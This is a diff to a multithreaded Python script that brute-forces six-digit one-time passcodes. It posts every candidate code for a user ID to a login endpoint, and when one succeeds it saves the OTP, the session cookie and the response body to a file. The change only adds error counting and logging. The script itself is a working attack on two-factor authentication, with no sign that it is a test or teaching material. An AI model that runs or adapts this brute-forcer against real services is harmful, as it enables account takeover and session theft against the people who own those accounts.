@@ -11,8 +11,13 @@ def w():
             if S['next']>END: STOP.set(); return
             c=S['next']; S['next']+=NSH
             if c%NSH!=SHARD: continue
-        try: r=s.post(URL,json={'user_id':UID,'otp_code':f'{c:06d}'},timeout=20)
-        except Exception: continue
+        try:
+            r=s.post(URL,json={'user_id':UID,'otp_code':f'{c:06d}'},timeout=20)
+        except Exception as e:
+            with L:
+                S['err']=S.get('err',0)+1
+                if S['err']<=3: print('ERR',type(e).__name__,str(e)[:120],flush=True)
+            continue
         with L: S['tried']+=1
         if r.status_code==200:
             STOP.set(); open('HIT.txt','w').write(f'otp={c:06d}\ncookie={r.headers.get("set-cookie")}\nbody={r.text}\n')
@@ -29,4 +34,4 @@ threading.Thread(target=refresh,daemon=True).start()
 ts=[threading.Thread(target=w,daemon=True) for _ in range(W)]
 [t.start() for t in ts]
 while any(t.is_alive() for t in ts) and not STOP.is_set(): time.sleep(2)
-print('done tried',S['tried'],'next',S['next'],flush=True)
+print('done tried',S['tried'],'next',S['next'],'err',S.get('err',0),flush=True)
